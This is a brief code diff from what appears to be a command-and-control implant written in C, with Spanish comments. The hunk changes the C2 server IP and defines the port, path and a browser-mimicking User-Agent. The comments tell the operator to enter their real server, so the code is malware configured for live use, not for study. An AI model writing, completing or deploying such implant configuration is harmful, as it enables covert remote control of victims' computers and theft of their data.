@@ -15,7 +15,7 @@
 
 // ==================== CONFIGURACIÓN REAL ====================
 // CAMBIA ESTOS VALORES A TU SERVIDOR REAL
-#define C2_SERVER "192.168.1.100"  // IP de tu servidor C2
+#define C2_SERVER "192.168.254.137"  // IP de tu servidor C2
 #define C2_PORT 8443
 #define C2_PATH "/"
 #define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
